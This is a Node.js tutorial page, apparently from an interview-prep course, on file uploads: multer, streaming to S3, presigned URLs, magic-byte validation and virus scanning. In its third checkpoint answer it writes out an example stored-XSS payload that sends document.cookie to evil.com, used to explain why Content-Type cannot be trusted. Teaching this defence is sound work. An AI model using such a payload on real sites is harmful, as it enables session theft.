---
title: "File Uploads & Presigned URLs"
outline: deep
---

# File Uploads & Presigned URLs

| Interview weight | Node version | Prerequisites |
|---|---|---|
| :fire::fire: | Node 22+ (native `fetch`, Web Streams) | [Streams & Backpressure](/nodejs/module-04/02-streams-backpressure), [REST Best Practices](./01-rest-best-practices) |

## 🗣️ In Plain English

::: tip In Plain English
Imagine you are organizing a conference and attendees need to submit their presentation slides. You have two ways to handle this.

**Option A — the relay desk.** Every attendee walks up to your registration desk and hands over their USB drive. Your staff copies the files onto a laptop, then uploads them to the conference cloud storage. This works for small files, but when someone shows up with a 4 GB video, your staff member is stuck copying for twenty minutes while a queue forms behind them. Your laptop also needs enough disk space to hold the video temporarily.

**Option B — the direct drop-off.** Instead, you give each attendee a special one-time-use locker code. They walk directly to the storage room and deposit their files using the code. Your registration desk never touches the file — it only hands out codes. The code expires after 15 minutes and only works for files under a certain size. This is a **presigned URL**.

Most production systems use Option B for anything larger than a few megabytes. Your API server stays lightweight — it only signs URLs and records metadata. The heavy lifting of receiving and storing bytes happens in object storage (S3, GCS, Azure Blob), which is purpose-built for it and scales independently.

Option A still matters for small files — profile pictures, CSV imports — where the simplicity of a single HTTP request outweighs the complexity of a two-step presigned URL flow. For these, the key is to never buffer the entire file in memory. Treat the incoming file as a stream: read a chunk, process it (or forward it to storage), discard it, read the next chunk. Your server's memory usage stays flat regardless of file size.
:::

## ⚙️ Under the Hood

### Multipart/Form-Data — How the Wire Format Works

When a browser sends a file via `<input type="file">`, it uses `multipart/form-data` encoding. This is not JSON — it is a MIME-encoded body with boundaries separating each field:

```
POST /upload HTTP/1.1
Content-Type: multipart/form-data; boundary=----WebKitFormBoundaryABC123

------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="description"

My vacation photo
------WebKitFormBoundaryABC123
Content-Disposition: form-data; name="file"; filename="photo.jpg"
Content-Type: image/jpeg

<binary data here>
------WebKitFormBoundaryABC123--
```

The server must parse this format by scanning for boundaries and extracting each part. Never attempt to parse this yourself — use a battle-tested library.

### Multer — File Upload Middleware for Express

```ts
// run: node --experimental-strip-types multer-demo.ts
// requires: npm install express multer @types/express @types/multer

import express from 'express';
import multer from 'multer';

// Option 1: Memory storage — file is buffered in a Node.js Buffer
// Good for small files that you immediately forward elsewhere
const memoryUpload = multer({
  storage: multer.memoryStorage(),
  limits: {
    fileSize: 5 * 1024 * 1024,    // 5 MB max
    files: 1,                       // Max 1 file per request
    fields: 10,                     // Max 10 non-file fields
  },
  fileFilter: (_req, file, cb) => {
    const allowed = ['image/jpeg', 'image/png', 'image/webp'];
    if (allowed.includes(file.mimetype)) {
      cb(null, true);
    } else {
      cb(new Error(`File type ${file.mimetype} not allowed`));
    }
  },
});

// Option 2: Disk storage — file is streamed to a temp file on disk
// Good when you need to process the file locally (resize, scan)
const diskUpload = multer({
  storage: multer.diskStorage({
    destination: '/tmp/uploads',
    filename: (_req, file, cb) => {
      const unique = `${Date.now()}-${Math.round(Math.random() * 1e9)}`;
      cb(null, `${unique}-${file.originalname}`);
    },
  }),
  limits: { fileSize: 50 * 1024 * 1024 },  // 50 MB
});

const app = express();

// Memory storage: file available as req.file.buffer
app.post('/avatar', memoryUpload.single('avatar'), (req, res) => {
  if (!req.file) {
    res.status(400).json({ error: 'No file uploaded' });
    return;
  }
  console.log(`Received ${req.file.size} bytes in memory`);
  // Forward req.file.buffer to S3, process with Sharp, etc.
  res.json({ size: req.file.size, mimetype: req.file.mimetype });
});

// Disk storage: file available as req.file.path
app.post('/document', diskUpload.single('doc'), (req, res) => {
  if (!req.file) {
    res.status(400).json({ error: 'No file uploaded' });
    return;
  }
  console.log(`Saved to ${req.file.path}`);
  // Process the file from disk, then delete the temp file
  res.json({ path: req.file.path });
});

app.listen(3000);
```

**Warning:** `memoryStorage` buffers the entire file in a Node.js `Buffer`. A 100 MB file consumes 100 MB of heap. With 10 concurrent uploads, that is 1 GB — enough to OOM your container. Use memory storage only for small files (avatars, thumbnails) with strict size limits.

### Streaming Uploads to S3

The correct approach for large files: pipe the incoming request stream directly to S3 without buffering in memory.

```ts
// run: node --experimental-strip-types s3-stream-upload.ts
// requires: npm install @aws-sdk/client-s3 @aws-sdk/lib-storage busboy

import { S3Client } from '@aws-sdk/client-s3';
import { Upload } from '@aws-sdk/lib-storage';
import { createServer, IncomingMessage, ServerResponse } from 'node:http';
import { Readable } from 'node:stream';
import { randomUUID } from 'node:crypto';

const s3 = new S3Client({ region: 'us-east-1' });

// Using busboy for low-level multipart parsing with streaming
import Busboy from 'busboy';

async function handleUpload(req: IncomingMessage, res: ServerResponse): Promise<void> {
  const busboy = Busboy({
    headers: req.headers as Record<string, string>,
    limits: { fileSize: 500 * 1024 * 1024 },  // 500 MB
  });

  const uploads: Promise<string>[] = [];

  busboy.on('file', (fieldname, fileStream, info) => {
    const key = `uploads/${randomUUID()}/${info.filename}`;

    // Stream directly to S3 — no buffering in server memory
    const upload = new Upload({
      client: s3,
      params: {
        Bucket: 'my-bucket',
        Key: key,
        Body: fileStream as unknown as Readable,
        ContentType: info.mimeType,
      },
      // Multipart upload: splits into 5 MB chunks, uploads in parallel
      partSize: 5 * 1024 * 1024,
      queueSize: 4,  // 4 concurrent part uploads
    });

    uploads.push(
      upload.done().then(() => key),
    );
  });

  busboy.on('finish', async () => {
    try {
      const keys = await Promise.all(uploads);
      res.writeHead(201, { 'Content-Type': 'application/json' });
      res.end(JSON.stringify({ keys }));
    } catch (err) {
      res.writeHead(500);
      res.end('Upload failed');
    }
  });

  // Pipe the incoming request directly to busboy
  // req (IncomingMessage) is a Readable stream
  req.pipe(busboy);
}

const server = createServer(handleUpload);
server.listen(3000);

// Memory profile:
// - Without streaming: 500 MB file = 500 MB heap usage
// - With streaming: 500 MB file = ~25 MB heap usage (5 MB part buffer × ~4 concurrent + overhead)
```

### Presigned URLs — The Production Pattern

The presigned URL workflow removes the API server from the data path entirely:

```ts
// run: node --experimental-strip-types presigned-url.ts
// requires: npm install @aws-sdk/client-s3 @aws-sdk/s3-request-presigner

import { S3Client, PutObjectCommand, GetObjectCommand } from '@aws-sdk/client-s3';
import { getSignedUrl } from '@aws-sdk/s3-request-presigner';
import { createServer } from 'node:http';
import { randomUUID } from 'node:crypto';

const s3 = new S3Client({ region: 'us-east-1' });
const BUCKET = 'my-upload-bucket';

// Step 1: Client requests a presigned upload URL from your API
async function generateUploadUrl(
  filename: string,
  contentType: string,
  maxSizeBytes: number,
): Promise<{ uploadUrl: string; key: string }> {
  const key = `uploads/${randomUUID()}/${filename}`;

  const command = new PutObjectCommand({
    Bucket: BUCKET,
    Key: key,
    ContentType: contentType,
    // Content-Length conditions are enforced by S3 bucket policies
  });

  const uploadUrl = await getSignedUrl(s3, command, {
    expiresIn: 900,  // URL valid for 15 minutes
  });

  return { uploadUrl, key };
}

// Step 2: Client uploads directly to S3 using the presigned URL
// (This happens in the browser/mobile app — NOT on your server)
//
// fetch(uploadUrl, {
//   method: 'PUT',
//   headers: { 'Content-Type': contentType },
//   body: file,   // File object from <input type="file">
// });

// Step 3: Client confirms the upload to your API
// POST /uploads/confirm { key: "uploads/abc/photo.jpg" }
// Your server:
// 1. Verifies the object exists in S3 (HeadObject)
// 2. Checks file size and type
// 3. Creates a database record linking the file to the entity
// 4. Optionally triggers async processing (resize, scan)

// Generate a presigned download URL (for private files)
async function generateDownloadUrl(key: string): Promise<string> {
  const command = new GetObjectCommand({
    Bucket: BUCKET,
    Key: key,
  });

  return getSignedUrl(s3, command, {
    expiresIn: 3600,  // 1 hour download window
  });
}

const server = createServer(async (req, res) => {
  if (req.method === 'POST' && req.url === '/uploads/sign') {
    const { uploadUrl, key } = await generateUploadUrl(
      'photo.jpg',
      'image/jpeg',
      10 * 1024 * 1024,
    );
    res.writeHead(200, { 'Content-Type': 'application/json' });
    res.end(JSON.stringify({ uploadUrl, key }));
  }
});

server.listen(3000);
```

**Why presigned URLs are better for large files:**
- Your API server never handles file bytes — it stays fast and lightweight
- S3 is purpose-built for receiving large files (multipart, resumable)
- Upload bandwidth comes from S3, not your server
- Horizontal scaling of uploads is free (S3 handles it)
- Your server only signs URLs and stores metadata — two fast operations

### File Type Validation — Never Trust Content-Type

```ts
// run: node --experimental-strip-types magic-bytes.ts

// Check the actual binary content, not the declared Content-Type

const FILE_SIGNATURES: Array<{ mime: string; magic: number[]; offset?: number }> = [
  { mime: 'image/png',       magic: [0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A] },
  { mime: 'image/jpeg',      magic: [0xFF, 0xD8, 0xFF] },
  { mime: 'image/gif',       magic: [0x47, 0x49, 0x46, 0x38] },
  { mime: 'image/webp',      magic: [0x52, 0x49, 0x46, 0x46], },  // RIFF header
  { mime: 'application/pdf', magic: [0x25, 0x50, 0x44, 0x46] },   // %PDF
  { mime: 'application/zip', magic: [0x50, 0x4B, 0x03, 0x04] },   // PK..
];

function detectMimeType(header: Buffer): string | null {
  for (const sig of FILE_SIGNATURES) {
    const offset = sig.offset ?? 0;
    const slice = header.subarray(offset, offset + sig.magic.length);
    if (sig.magic.every((byte, i) => slice[i] === byte)) {
      return sig.mime;
    }
  }
  return null;
}

// For streaming validation, read just the first few bytes:
async function validateStreamType(
  stream: AsyncIterable<Buffer>,
  allowedTypes: Set<string>,
): Promise<{ type: string; chunks: Buffer[] }> {
  const chunks: Buffer[] = [];
  let headerChecked = false;
  let detectedType: string | null = null;

  for await (const chunk of stream) {
    chunks.push(chunk);

    if (!headerChecked && Buffer.concat(chunks).length >= 16) {
      detectedType = detectMimeType(Buffer.concat(chunks));
      if (!detectedType || !allowedTypes.has(detectedType)) {
        throw new Error(`File type '${detectedType ?? 'unknown'}' is not allowed`);
      }
      headerChecked = true;
    }
  }

  if (!headerChecked) {
    throw new Error('File too small to determine type');
  }

  return { type: detectedType!, chunks };
}
```

### Virus Scanning Pipeline

For user-uploaded files in regulated environments, scan before making files public:

```
Upload Flow:
┌──────────┐     ┌──────────────┐     ┌──────────────┐     ┌──────────────┐
│  Client   │────▶│  API Server  │────▶│  Quarantine  │────▶│  Scan Queue  │
│           │     │  (sign URL)  │     │  S3 Bucket   │     │  (BullMQ)    │
└──────────┘     └──────────────┘     └──────────────┘     └──────┬───────┘
                                                                   │
                                                      ┌───────────▼──────────┐
                                                      │  Scanner Worker      │
                                                      │  (ClamAV / external) │
                                                      └───────────┬──────────┘
                                                                   │
                                               ┌──────────────────▼────────────────┐
                                               │                                    │
                                        Clean ▼                              Infected ▼
                                  ┌─────────────────┐                  ┌─────────────────┐
                                  │  Move to Public  │                  │  Delete + Notify │
                                  │  S3 Bucket       │                  │  User            │
                                  └─────────────────┘                  └─────────────────┘
```

```ts
// Conceptual scanner worker
// requires: npm install bullmq clamav.js

// import { Worker } from 'bullmq';
//
// const scanWorker = new Worker('file-scan', async (job) => {
//   const { key, uploadId } = job.data;
//
//   // 1. Download from quarantine bucket
//   const stream = await s3.send(new GetObjectCommand({
//     Bucket: 'quarantine-bucket',
//     Key: key,
//   }));
//
//   // 2. Pipe through ClamAV scanner
//   const scanResult = await clamav.scanStream(stream.Body);
//
//   if (scanResult.isClean) {
//     // 3a. Copy to public bucket
//     await s3.send(new CopyObjectCommand({
//       CopySource: `quarantine-bucket/${key}`,
//       Bucket: 'public-bucket',
//       Key: key,
//     }));
//     // 4a. Delete from quarantine
//     await s3.send(new DeleteObjectCommand({
//       Bucket: 'quarantine-bucket', Key: key,
//     }));
//     // 5a. Update database: upload status = 'ready'
//     await db.upload.update(uploadId, { status: 'ready' });
//   } else {
//     // 3b. Delete infected file
//     await s3.send(new DeleteObjectCommand({
//       Bucket: 'quarantine-bucket', Key: key,
//     }));
//     // 4b. Update database: upload status = 'rejected'
//     await db.upload.update(uploadId, { status: 'rejected', reason: 'malware' });
//     // 5b. Notify user
//   }
// });
```

### Image Processing with Sharp

```ts
// run: node --experimental-strip-types sharp-demo.ts
// requires: npm install sharp

import sharp from 'sharp';
import { Readable, pipeline } from 'node:stream';
import { promisify } from 'node:util';

const pipelineAsync = promisify(pipeline);

// Process images asynchronously via a queue — never in the request path
async function processAvatar(inputBuffer: Buffer): Promise<Buffer> {
  return sharp(inputBuffer)
    .resize(200, 200, {
      fit: 'cover',       // Crop to fill the dimensions
      position: 'centre',
    })
    .webp({ quality: 80 })  // Convert to WebP for smaller size
    .toBuffer();
}

// Streaming variant — constant memory for large images
async function processLargeImage(
  inputStream: Readable,
  outputPath: string,
): Promise<void> {
  const transformer = sharp()
    .resize(1920, 1080, { fit: 'inside', withoutEnlargement: true })
    .jpeg({ quality: 85, progressive: true });

  await pipelineAsync(inputStream, transformer, sharp().toFile(outputPath));
}

// IMPORTANT: Run Sharp processing in a queue worker, not the API handler.
// Sharp uses libvips (native C library via N-API) and can be CPU-intensive.
// Processing in the request path blocks the event loop and increases latency
// for all concurrent requests.
```

### CDN for Serving — CloudFront Signed URLs

For private files served through a CDN:

```ts
// Conceptual — CloudFront signed URLs
// requires: npm install @aws-sdk/cloudfront-signer

// import { getSignedUrl } from '@aws-sdk/cloudfront-signer';
//
// const signedUrl = getSignedUrl({
//   url: `https://cdn.example.com/uploads/${key}`,
//   keyPairId: 'APKAEXAMPLE',
//   privateKey: process.env.CF_PRIVATE_KEY!,
//   dateLessThan: new Date(Date.now() + 3600_000).toISOString(),  // 1 hour
// });

// Architecture:
// S3 (origin, private) → CloudFront (CDN, signed URLs) → Client
// Benefits:
// - Files cached at edge locations globally
// - S3 is never hit directly — lower cost, better latency
// - Signed URLs control access without making the bucket public
// - CloudFront handles Range requests for video seeking automatically
```

## 💥 Where It Bites (Production Lens)

::: warning Where It Bites
**1. Buffering large files in memory.** Using `multer` with `memoryStorage` for a 200 MB video upload: the entire file is buffered in a Node.js `Buffer`, consuming 200 MB of heap per concurrent upload. With 10 concurrent uploads and a 512 MB container, the process OOMs. Symptoms: `JavaScript heap out of memory`, pod restarts in K8s. Fix: use streaming (busboy + pipe to S3) or presigned URLs.

**2. No file size limit on the server.** Without `limits.fileSize` in multer or `Content-Length` validation, a malicious client streams a 50 GB file. Even with disk storage, you fill the disk and crash the container. With memory storage, you OOM instantly. Always enforce size limits at multiple layers: multer config, nginx `client_max_body_size`, and S3 bucket policies for presigned URLs.

**3. Trusting Content-Type for security decisions.** A user uploads a file with `Content-Type: image/png` but the actual content is an HTML file containing JavaScript. If served from your domain, the browser may execute it (stored XSS). Always validate via magic bytes, and serve user-uploaded files from a separate domain (e.g., `uploads.example.com`) with `Content-Disposition: attachment` headers.

**4. Presigned URL with no expiration or overly long expiration.** A presigned upload URL valid for 7 days can be shared, reused, and abused. Someone could upload arbitrary content to your S3 bucket for a week. Use short expiration times (5-15 minutes for uploads), and always validate the uploaded content in the confirmation step.
:::

## 🎯 Checkpoint

::: details Question 1 — Presigned URL flow
**Q:** Walk through the complete presigned URL upload flow, step by step. What happens if the client never calls the confirmation endpoint?

**A:** (1) Client calls `POST /uploads/sign` with the filename, content type, and intended use. (2) Server generates a unique S3 key, creates a presigned PUT URL with a short expiration (e.g., 15 minutes), stores a pending upload record in the database, and returns the URL + key. (3) Client uploads the file directly to S3 using the presigned URL with a PUT request — the API server never sees the bytes. (4) Client calls `POST /uploads/confirm` with the key. (5) Server verifies the object exists in S3 via `HeadObject`, checks size and content type, creates the final database record, and optionally triggers async processing (resize, virus scan).

If the client never confirms: the file sits in S3 as an orphan. Handle this with S3 Lifecycle Rules that delete objects in the upload prefix after a configurable period (e.g., 24 hours) if they have not been moved to the permanent prefix. Also run a periodic cleanup job that deletes database records in "pending" status older than the expiration window.
:::

::: details Question 2 — Streaming vs buffering
**Q:** Your API receives file uploads and forwards them to S3. Explain the memory difference between buffering the entire file with `multer.memoryStorage()` and streaming with busboy + `@aws-sdk/lib-storage`. Include approximate memory usage for a 500 MB file with 10 concurrent uploads.

**A:** With `multer.memoryStorage()`, each upload is read into a `Buffer` allocated on the V8 heap. A 500 MB file requires a single 500 MB allocation (plus overhead for the `Buffer` object). With 10 concurrent uploads: ~5 GB of heap — far beyond typical container limits, triggering OOM kills.

With busboy + `@aws-sdk/lib-storage`, the upload is streamed: busboy parses the multipart stream chunk by chunk, and `Upload` from `@aws-sdk/lib-storage` consumes chunks as they arrive, buffering only enough for the current S3 multipart part (default 5 MB) times the concurrent part upload count (default 4). Per upload: ~20 MB. With 10 concurrent uploads: ~200 MB — an order of magnitude less. The server's memory usage is proportional to concurrency, not to file size. This is the same backpressure principle covered in [Streams & Backpressure](/nodejs/module-04/02-streams-backpressure).
:::

::: details Question 3 — Magic bytes vs Content-Type
**Q:** Why is checking `Content-Type` insufficient for file type validation? Describe a concrete attack that magic byte validation prevents.

**A:** `Content-Type` is a client-controlled HTTP header — the client can set it to any value. An attacker uploads a file with `Content-Type: image/png` but the actual content is an HTML file containing `<script>document.location='https://evil.com/steal?cookie='+document.cookie</script>`. If the server trusts `Content-Type`, stores the file, and later serves it from the same origin (e.g., `https://app.example.com/uploads/file.png`), the browser may sniff the content type, detect HTML, and execute the script — resulting in stored XSS that steals session cookies.

Magic byte validation reads the first N bytes of the actual file content. A PNG file starts with `89 50 4E 47` — the HTML file does not match this signature and is rejected at upload time. This prevents the attack at the point of ingestion rather than relying on serving-time mitigations (though you should also set `X-Content-Type-Options: nosniff` and serve from a separate domain).
:::

## Key Mental Models

- **Presigned URLs move bytes off your server.** Your API signs a URL (fast, cheap, scales horizontally). S3 receives the bytes (purpose-built, scales independently). This is the production pattern for anything over a few megabytes.
- **Streaming is about memory, not speed.** A streamed upload is not necessarily faster — it uses constant memory regardless of file size. Buffering uses memory proportional to file size, which is a scalability cliff.
- **Content-Type is a suggestion, magic bytes are evidence.** Never make security decisions based on a client-controlled header. Read the actual bytes.
- **Process heavy work (resize, scan) asynchronously.** Image resizing and virus scanning are CPU-intensive. Do them in queue workers, not in the request handler. The upload response should be fast; processing happens in the background.
- **Orphaned uploads are inevitable.** Clients crash, users close tabs, networks drop. Build cleanup: S3 Lifecycle Rules for storage, periodic jobs for database records.

## Related

- [Streams & Backpressure](/nodejs/module-04/02-streams-backpressure) — the streaming primitives that make constant-memory uploads possible
- [REST Best Practices](./01-rest-best-practices) — the API conventions file upload endpoints follow
- [Request Validation & Error Handling](./03-validation-error-handling) — file type validation as a special case of input validation
